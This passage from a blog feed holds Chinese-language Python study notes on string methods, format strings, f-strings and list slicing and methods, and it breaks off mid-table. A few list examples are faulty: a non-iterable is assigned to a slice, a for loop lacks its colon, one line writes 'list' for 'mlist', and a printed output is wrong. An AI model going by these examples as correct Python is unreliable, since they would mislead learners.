        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>参考资料：<br><a href="https://www.bilibili.com/video/BV1c4411e77t">【Python教程】《零基础入门学习Python》最新版（2022年12月26日更新）</a></p></blockquote><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>关于字符串，主要分为两大块知识：一块是各种字符串相关函数，另一块是format字符串和f-string</p><h2 id="1-字母大小写转换"><a href="#1-字母大小写转换" class="headerlink" title="1. 字母大小写转换"></a>1. 字母大小写转换</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">str.capitalize()</td><td style="text-align:center">首字母大写，其余小写</td></tr><tr><td style="text-align:center">str.casefold()</td><td style="text-align:center">字母全变为小写，可以支持多种语言</td></tr><tr><td style="text-align:center">str.title()</td><td style="text-align:center">每个单词首字母都大写，其余小写</td></tr><tr><td style="text-align:center">str.swapcase()</td><td style="text-align:center">字母大小写全部和原来相反</td></tr><tr><td style="text-align:center">str.upper()</td><td style="text-align:center">字母全变为大写，英语之外可能不支持</td></tr><tr><td style="text-align:center">str.lower()</td><td style="text-align:center">字母全变为小写</td></tr></tbody></table></div><blockquote><p>注意：<br>这些函数都没有直接改变str指向的字符串，而是按规则生成了一个新的字符串，即str还是与原本的字符串挂钩<br>因此要改变str时：str = str.function()</p></blockquote><h2 id="2-对齐函数"><a href="#2-对齐函数" class="headerlink" title="2. 对齐函数"></a>2. 对齐函数</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">str.center(width, fillchar=’ ‘)</td><td style="text-align:center">width设置总字符数，fillchar设置填充字符，使str<code>居中</code></td></tr><tr><td style="text-align:center">str.ljust(width, fillchar’ ‘)</td><td style="text-align:center">width设置总字符数，fillchar设置填充字符，使str<code>左对齐</code></td></tr><tr><td style="text-align:center">str.rjust(width, fillchar’ ‘)</td><td style="text-align:center">width设置总字符数，fillchar设置填充字符，使str<code>右对齐</code></td></tr><tr><td style="text-align:center">str.zfill(width)</td><td style="text-align:center">width设置总字符数，str左侧用0填充，若str是数字字符串，可以支持正负数</td></tr></tbody></table></div><h2 id="3-查找函数"><a href="#3-查找函数" class="headerlink" title="3. 查找函数"></a>3. 查找函数</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">str.count(char, start, end)</td><td style="text-align:center">返回str在所选范围char的<code>个数</code>，起止位置为可选参数</td></tr><tr><td style="text-align:center">str.find(char, start, end)</td><td style="text-align:center">返回str在所选范围<code>从左往右</code>第一个为char的<code>下标</code>，找不到则返回-1，起止位置为可选参数</td></tr><tr><td style="text-align:center">str.rfind(char, start, end)</td><td style="text-align:center">返回str在所选范围<code>从右往左</code>第一个为char的<code>下标</code>，找不到则返回-1，起止位置为可选参数</td></tr><tr><td style="text-align:center">str.index()</td><td style="text-align:center">返回str在所选范围<code>从左往右</code>第一个为char的<code>下标</code>，找不到则报错，起止位置为可选参数</td></tr><tr><td style="text-align:center">str.rindex()</td><td style="text-align:center">返回str在所选范围<code>从右往左</code>第一个为char的<code>下标</code>，找不到则报错，起止位置为可选参数</td></tr></tbody></table></div><h2 id="4-转换函数"><a href="#4-转换函数" class="headerlink" title="4. 转换函数"></a>4. 转换函数</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">str.expandtabs(num)</td><td style="text-align:center">将str中所有Tab转换为num个空格</td></tr><tr><td style="text-align:center">str.replace(old, new, count=-1)</td><td style="text-align:center">将str中old转换为new，可选参数count设置转换个数，默认-1表示全部转换</td></tr><tr><td style="text-align:center">str.translate(table)</td><td style="text-align:center">table表示一个转换规则，可由maketrans()生成，可以实现table中对应字符的转换</td></tr><tr><td style="text-align:center">str.maketrans(origin, trans, ignorestr)</td><td style="text-align:center">生成一个转换规则，表示将origin中的对象转换为trans中对应的对象，与ignorestr相同的字符串不会被转换</td></tr></tbody></table></div><h2 id="5-判断函数"><a href="#5-判断函数" class="headerlink" title="5. 判断函数"></a>5. 判断函数</h2><blockquote><p>这类函数会根据判断的结果返回bool类型数值</p></blockquote><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">str.startswith(prefix, start, end)</td><td style="text-align:center">判断是否以prefix开头，prefix可以为元组，元组中任意一个元素满足即可，起始位置为可选参数</td></tr><tr><td style="text-align:center">str.endswith(suffix, start, end)</td><td style="text-align:center">判断是否以suffix结尾，suffix可以为元组，元组中任意一个元素满足即可，起始位置为可选参数</td></tr><tr><td style="text-align:center">str.isupper()</td><td style="text-align:center">判断是否全为大写</td></tr><tr><td style="text-align:center">str.islower()</td><td style="text-align:center">判断是否全为小写</td></tr><tr><td style="text-align:center">str.istitle()</td><td style="text-align:center">判断str是否为标题格式</td></tr><tr><td style="text-align:center">str.isalpha()</td><td style="text-align:center">判断是否全为字母</td></tr><tr><td style="text-align:center">str.isascii()</td><td style="text-align:center">判断是否都为ascii</td></tr><tr><td style="text-align:center">str.isspace()</td><td style="text-align:center">判断是否都为空白字符(空格、Tab、换行符等)</td></tr><tr><td style="text-align:center">str.isprintable()</td><td style="text-align:center">判断是否都可以打印</td></tr><tr><td style="text-align:center">str.isdecimal()</td><td style="text-align:center">判断是否数字的一个标准（范围最小）</td></tr><tr><td style="text-align:center">str.isdigit()</td><td style="text-align:center">判断是否数字的一个标准（范围适中）</td></tr><tr><td style="text-align:center">str.isnumeric()</td><td style="text-align:center">判断是否数字的一个标准（范围最大）</td></tr><tr><td style="text-align:center">str.isalnum()</td><td style="text-align:center">判断是否全为字母或数字</td></tr><tr><td style="text-align:center">str.isidentifier()</td><td style="text-align:center">判断str是否为Python的合法标识符</td></tr></tbody></table></div><p><strong>5.1 prefix/suffix为元组的例子</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;她爱Python&quot;</span>.startswith((<span class="string">&quot;我&quot;</span>, <span class="string">&quot;你&quot;</span>, <span class="string">&quot;她&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;总有人爱Python&quot;</span>)</span><br><span class="line"><span class="comment"># &quot;总有人爱Python&quot;</span></span><br></pre></td></tr></table></figure><br><strong>5.2 isdecimal() &amp; isdigit() &amp; isnumeric() 区别</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;123&quot;</span></span><br><span class="line"><span class="comment"># All: True</span></span><br><span class="line">x = <span class="string">&quot;2²&quot;</span></span><br><span class="line"><span class="comment"># x.isdecimal(): False</span></span><br><span class="line"><span class="comment"># x.isdigit() &amp; x.isnumeric(): True</span></span><br><span class="line">x = <span class="string">&quot;一二三&quot;</span></span><br><span class="line"><span class="comment"># x.isdecimal() &amp; x.isdigit(): False</span></span><br><span class="line"><span class="comment"># x.isnumeric(): True</span></span><br><span class="line">x = <span class="string">&quot;我不是数字&quot;</span></span><br><span class="line"><span class="comment"># All: False</span></span><br></pre></td></tr></table></figure></p><h2 id="6-截取函数"><a href="#6-截取函数" class="headerlink" title="6. 截取函数"></a>6. 截取函数</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">str.strip(chars=None)</td><td style="text-align:center">从左右两侧删除选定字符，直到遇到第一个非选定字符时停止；默认None表示空白字符，chars是字符串，<code>会被视为集合</code></td></tr><tr><td style="text-align:center">str.lstrip(chars=None)</td><td style="text-align:center">从左侧删除选定字符，直到遇到第一个非选定字符时停止；默认None表示空白字符，chars是字符串，<code>会被视为集合</code></td></tr><tr><td style="text-align:center">str.rstrip(chars=None)</td><td style="text-align:center">从右侧删除选定字符，直到遇到第一个非选定字符时停止；默认None表示空白字符，chars是字符串，<code>会被视为集合</code></td></tr><tr><td style="text-align:center">str.removeprefix(prefix)</td><td style="text-align:center">去除前缀prefix</td></tr><tr><td style="text-align:center">str.removesuffix(suffix)</td><td style="text-align:center">去除后缀suffix</td></tr></tbody></table></div><h2 id="7-拆分与拼接"><a href="#7-拆分与拼接" class="headerlink" title="7. 拆分与拼接"></a>7. 拆分与拼接</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">str.partition(char)</td><td style="text-align:center"><code>从左往右</code>找到第一个为char的字符，以此为结点拆分得到一个三元组</td></tr><tr><td style="text-align:center">str.rpartition(char)</td><td style="text-align:center"><code>从右往左</code>找到第一个为char的字符，以此为结点拆分得到一个三元组</td></tr><tr><td style="text-align:center">str.split(sep=None, maxsplit=-1)</td><td style="text-align:center">将str拆分为多个字符串并返回其组成的列表；sep设置拆分字符，默认为空白字符；maxsplit设置最大分割数，默认-1表示全部拆分</td></tr><tr><td style="text-align:center">str.rsplit(sep=None, maxsplit=-1)</td><td style="text-align:center">从右往左开始拆分，功能与split()相同</td></tr><tr><td style="text-align:center">str.splitlines(save=False)</td><td style="text-align:center">以换行符为拆分字符将str拆分，可识别<code>不同系统的换行符</code>；可选参数save控制是否保留换行符到其前面的子串</td></tr><tr><td style="text-align:center">str.join(iterable)</td><td style="text-align:center">以str为结点连接iterable中各个元素，str可为空字符串</td></tr></tbody></table></div><blockquote><p>7.1 不同系统的换行符</p><blockquote><p>Unix, Linux: \n<br>Max OS: \r<br>Windows: \r\n</p></blockquote><p>7.2 join() 比 + 的优势在于 join() 的<code>处理效率</code>远高于 + </p></blockquote><h2 id="8-format字符串"><a href="#8-format字符串" class="headerlink" title="8. format字符串"></a>8. format字符串</h2><h3 id="8-1-基础用法"><a href="#8-1-基础用法" class="headerlink" title="8.1 基础用法"></a>8.1 基础用法</h3><p>问题来源：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">year = <span class="number">2023</span></span><br><span class="line">month = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;现在是 year 年 month 月&quot;</span>)</span><br><span class="line"><span class="comment"># 现在是 year 年 month 月</span></span><br></pre></td></tr></table></figure><br>类似于c\c++中的转义字符，Python的字符串也需要类似转义字符的存在<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">year = <span class="number">2023</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;现在是 &#123;&#125; 年 &#123;&#125; 月&quot;</span>.<span class="built_in">format</span>(year, month))</span><br><span class="line"><span class="comment"># 现在是 2023 年 1 月</span></span><br></pre></td></tr></table></figure><br>{}中可以通过写<code>下标</code>选择format()中的数据，且可以<code>重复使用</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;爱&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;我&quot;</span>, <span class="string">&quot;你&quot;</span>))</span><br><span class="line"><span class="comment"># 我爱你</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;1&#125;爱&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;我&quot;</span>, <span class="string">&quot;你&quot;</span>))</span><br><span class="line"><span class="comment"># 你爱我</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;mo&quot;</span>, <span class="string">&quot;ye&quot;</span>, <span class="string">&quot;yu&quot;</span>))</span><br><span class="line"><span class="comment"># momoyeyu</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;2&#125;,&#123;1&#125;,&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(*<span class="string">&#x27;abc&#x27;</span>))</span><br><span class="line"><span class="comment"># c,b,a</span></span><br></pre></td></tr></table></figure><br>还可以使用<code>关键字参数</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是&#123;name&#125;，我喜欢&#123;fav&#125;&quot;</span>.<span class="built_in">format</span>(name = <span class="string">&quot;墨末夜羽&quot;</span>, fav = <span class="string">&quot;吉他&quot;</span>))</span><br><span class="line"><span class="comment"># 我是墨末夜羽，我喜欢吉他</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是&#123;fav&#125;，我喜欢&#123;name&#125;&quot;</span>.<span class="built_in">format</span>(name = <span class="string">&quot;墨末夜羽&quot;</span>, fav = <span class="string">&quot;吉他&quot;</span>))</span><br><span class="line"><span class="comment"># 我是吉他，我喜欢墨末夜羽</span></span><br></pre></td></tr></table></figure></p><h3 id="8-2-语法格式"><a href="#8-2-语法格式" class="headerlink" title="8.2 语法格式"></a>8.2 语法格式</h3><blockquote><p>format_spec ::=  [[fill]align][sign][#][0][width][,][.precision][type]<br>fill        ::=  <any character> <code># 填充字符</code><br>align       ::=  “&lt;” | “&gt;” | “=” | “^” <code># 填充位置</code><br>sign        ::=  “+” | “-“ | “ “ <code># 显示符号</code><br>width       ::=  integer <code># 打印宽度</code><br>precision   ::=  integer <code># 浮点数精度</code><br>type        ::=  “b” | “c” | “d” | “e” | “E” | “f” | “F” | “g” | “G” | “n” | “o” | “s” | “x” | “X” | “%” <code># 数据表达方式</code></any></p></blockquote><p>8.2.1 示例<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;1:^10&#125;&#123;0:&lt;10&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;123&quot;</span>, <span class="string">&quot;456&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;   456    123       &#x27; # 居；左对齐</span></span><br><span class="line"><span class="string">&quot;&#123;:08&#125;&#123;:08&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1024</span>,-<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># &#x27;00001024-0001024&#x27; # 填充0；0不影响符号</span></span><br><span class="line"><span class="string">&quot;&#123;a:*&gt;10&#125;|&#123;b:*&lt;10&#125;&quot;</span>.<span class="built_in">format</span>(a=<span class="number">120</span>,b=<span class="number">110</span>)</span><br><span class="line"><span class="comment"># &#x27;*******120|110*******&#x27; # 选择*为填充字符</span></span><br><span class="line"><span class="string">&quot;&#123;:+,&#125;||&#123;:-_&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1234567</span>,<span class="number">7654321</span>)</span><br><span class="line"><span class="comment"># &#x27;+1,234,567||7_654_321&#x27; # 正数显示正号，每3位用（，）分开；负数显示负号（默认就显示），每3位用（_）分开</span></span><br><span class="line"><span class="string">&quot;&#123;:.2f&#125;||&#123;:.3g&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">12.3456</span>,<span class="number">12.345</span>)</span><br><span class="line"><span class="comment"># &#x27;12.35||12.3&#x27; # 小数点后保留2位数；总共保留3位数</span></span><br><span class="line"><span class="string">&quot;&#123;:.4&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Momoyeyu&quot;</span>)</span><br><span class="line"><span class="comment"># &quot;Momo&quot; # 保留前4个字符（对数字不可用）</span></span><br><span class="line"><span class="string">&quot;&#123;0:d&#125;||&#123;0:c&#125;||&#123;0:b&#125;||&#123;0:o&#125;||&#123;0:x&#125;||&#123;0:#b&#125;||&#123;0:#o&#125;||&#123;0:#x&#125;||&#123;0:e&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">127</span>)</span><br><span class="line"><span class="comment"># &#x27;127||\x7f||1111111||177||7f||0b1111111||0o177||0x7f||1.270000e+02&#x27; # 详情看下表</span></span><br></pre></td></tr></table></figure></p><p>8.2.2 关于type</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">b</td><td style="text-align:center">以二进制输出</td></tr><tr><td style="text-align:center">#b</td><td style="text-align:center">b的基础上，会在数前标0b，表示这是二进制数</td></tr><tr><td style="text-align:center">c</td><td style="text-align:center">以Unicode输出</td></tr><tr><td style="text-align:center">d</td><td style="text-align:center">以十进制输出</td></tr><tr><td style="text-align:center">o</td><td style="text-align:center">以八进制输出</td></tr><tr><td style="text-align:center">#o</td><td style="text-align:center">o的基础上，会在数前标0o，表示这是八进制数</td></tr><tr><td style="text-align:center">x</td><td style="text-align:center">以十六进制输出</td></tr><tr><td style="text-align:center">#x</td><td style="text-align:center">x的基础上，会在数前标0x，表示这是十六进制数</td></tr><tr><td style="text-align:center">X</td><td style="text-align:center">以十六进制输出</td></tr><tr><td style="text-align:center">#X</td><td style="text-align:center">X的基础上，后者会在数前标0X，表示这是十六进制数</td></tr><tr><td style="text-align:center">n</td><td style="text-align:center">类似于’d’，但会根据语言环境的分隔符插入到恰当位置</td></tr><tr><td style="text-align:center">None</td><td style="text-align:center">什么都不填，则对整数默认是’d’，对小数默认精度与所给值一样</td></tr><tr><td style="text-align:center">e</td><td style="text-align:center">以科学计数法输出，默认精度6位</td></tr><tr><td style="text-align:center">E</td><td style="text-align:center">以科学计数法输出，默认精度6位</td></tr><tr><td style="text-align:center">f</td><td style="text-align:center">以定点表示法输出，默认精度6位（非数用’nan’标示，无穷用’inf’标示）</td></tr><tr><td style="text-align:center">F</td><td style="text-align:center">以定点表示法输出，默认精度6位（非数用’NAN’标示，无穷用’INF’标示）</td></tr><tr><td style="text-align:center">g</td><td style="text-align:center">通用格式，小数以’f’输出，大数以’e’输出</td></tr><tr><td style="text-align:center">G</td><td style="text-align:center">通用格式，小数以’F’输出，大数以’E’输出</td></tr><tr><td style="text-align:center">%</td><td style="text-align:center">以百分比形式输出，默认精度同f，可通过’.num%’设置精度（num为一个数）</td></tr></tbody></table></div><p>8.2.3 format字符串综合运用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;:&#123;fill&#125;&#123;align&#125;&#123;width&#125;.&#123;prec&#125;&#123;typ&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.1415</span>, fill=<span class="string">&#x27;+&#x27;</span>, align=<span class="string">&#x27;^&#x27;</span>, width=<span class="number">10</span>, prec=<span class="number">3</span>, typ=<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;+++3.14+++&#x27;</span></span><br></pre></td></tr></table></figure></p><h2 id="9-f-string"><a href="#9-f-string" class="headerlink" title="9. f-string"></a>9. f-string</h2><blockquote><p>也叫f字符串，字符串前加’f’或’F’，其中{}内的变量名可以引用，算式可以计算，内容也可以格式化输出</p></blockquote><p><strong>9.1 示例</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">year = <span class="number">2023</span></span><br><span class="line"><span class="string">f&quot;现在是 <span class="subst">&#123;year&#125;</span> 年&quot;</span></span><br><span class="line"><span class="comment"># &#x27;现在是 2023 年&#x27;</span></span><br><span class="line"><span class="string">F&quot;1+2=<span class="subst">&#123;<span class="number">1</span>+<span class="number">2</span>&#125;</span>, 2²=<span class="subst">&#123;<span class="number">2</span>*<span class="number">2</span>&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># &#x27;1+2=3, 2²=4&#x27;</span></span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;-<span class="number">110</span>:<span class="number">0</span>=<span class="number">10</span>&#125;</span>||<span class="subst">&#123;<span class="number">3.1415</span>:<span class="number">.2</span>f&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># &#x27;-000000110||3.14&#x27;</span></span><br></pre></td></tr></table></figure></p><p><strong>9.2 f-string综合运用</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fill, align, width, prec, typ = <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="string">&#x27;g&#x27;</span></span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;<span class="number">3.1415</span>:&#123;fill&#125;</span><span class="subst">&#123;align&#125;</span><span class="subst">&#123;width&#125;</span>.<span class="subst">&#123;prec&#125;</span><span class="subst">&#123;typ&#125;</span>&#125;&quot;</span></span><br><span class="line"><span class="comment"># &#x27;+++3.14+++&#x27;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>f-string的效率比format字符串效率要高，但由于其是Python3.6才产生，考虑到兼容性，format字符串使用会更多</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表与元组</title>
      <link href="/2023/01/17/Python/Python-%E5%88%97%E8%A1%A8%E4%B8%8E%E5%85%83%E7%BB%84/"/>
      <url>/2023/01/17/Python/Python-%E5%88%97%E8%A1%A8%E4%B8%8E%E5%85%83%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>参考资料：<br><a href="https://www.bilibili.com/video/BV1c4411e77t">【Python教程】《零基础入门学习Python》最新版（2022年12月26日更新）</a></p></blockquote><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><h2 id="1-创建列表"><a href="#1-创建列表" class="headerlink" title="1. 创建列表"></a>1. 创建列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mlist = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">_ = []</span><br></pre></td></tr></table></figure><h2 id="2-访问列表"><a href="#2-访问列表" class="headerlink" title="2. 访问列表"></a>2. 访问列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(mlist[<span class="number">0</span>], end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mlist[-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 1 6</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> mlist</span><br><span class="line"><span class="built_in">print</span>(each, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment"># 1 2 3 4 5</span></span><br></pre></td></tr></table></figure><h2 id="3-修改列表"><a href="#3-修改列表" class="headerlink" title="3. 修改列表"></a>3. 修改列表</h2><p><strong>3.1 通过下标索引修改</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mlist = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">mlist[<span class="number">1</span>] = <span class="number">2</span></span><br></pre></td></tr></table></figure><br>结果：mlist = [1, 2, 3, 4, 5]</p><p><strong>3.2 通过切片修改</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mlist[<span class="number">3</span>:] = [<span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><br>结果：mlist = [1, 2, 3, 2, 1]</p><p><strong>3.3 通过运算符修改</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_1 = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">_2 = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">_ = _1 + _2</span><br><span class="line"><span class="comment"># _ = [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure></p><h2 id="4-切片"><a href="#4-切片" class="headerlink" title="4. 切片"></a>4. 切片</h2><h3 id="4-1-切片访问列表"><a href="#4-1-切片访问列表" class="headerlink" title="4.1 切片访问列表"></a>4.1 切片访问列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mlist = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">mlist[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="comment"># [3, 4]</span></span><br><span class="line">mlist[:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># [1, 2, 3]</span></span><br><span class="line">mlist[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># [3, 4, 5, 6]</span></span><br><span class="line">mlist[:]</span><br><span class="line"><span class="comment"># [1, 2, 3, 4, 5, 6]</span></span><br><span class="line">mlist[<span class="number">0</span>:<span class="number">6</span>:<span class="number">2</span>]</span><br><span class="line"><span class="comment"># [1, 3, 5]</span></span><br><span class="line">mlist[::-<span class="number">1</span>]</span><br><span class="line">[<span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>切片访问语法：<code>列表名[起始下标:停止下标:检索跨度]</code></p><p>注意：切片访问返回的是一个可迭代对象，所以切片可以实现浅拷贝<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mlist_copy = mlist[:]</span><br></pre></td></tr></table></figure></p><h3 id="4-2-切片修改列表"><a href="#4-2-切片修改列表" class="headerlink" title="4.2 切片修改列表"></a>4.2 切片修改列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mlist = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">mlist[<span class="built_in">len</span>(mlist):] = <span class="number">7</span></span><br><span class="line"><span class="comment"># mlist = [1, 2, 3, 4, 5, 6, 7]</span></span><br><span class="line"><span class="built_in">list</span>[<span class="built_in">len</span>(mlist):] = [<span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="comment"># mlist = [1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-函数"><a href="#5-函数" class="headerlink" title="5. 函数"></a>5. 函数</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">mlist.append(an element)</td><td style="text-align:center">将<code>一个元素</code>追加到列表mlist末尾</td></tr><tr><td style="text-align:center">mlist.extend(iterable)</td><td style="text-align:center">将<code>迭代结果</code>逐个追加到列表mlist末尾</td></tr><tr><td style="text-align:center">mlist.insert(an index, an element)</td><td style="text-align:center">将该元素<code>插入</code>到列表mlist的指定下标位置</td></tr><tr><td style="text-align:center">mlist.remove(an element)</td><td style="text-align:center">将该元素从列表mlist中<code>删除</code>，若元素不在列表内，则会报错</td></tr><tr><td style="text-align:center">mlist.pop(an index)</td><td style="text-align:center">将该下标对应元素从列表中<code>弹出</code></td></tr><tr><td style="text-align:center">mlist.clear()</td><td style="text-align:center">将列表mlist变为<code>空列表</code></td></tr><tr><td style="text-align:center">mlist.sort(key=None, reverse=False)</td><td 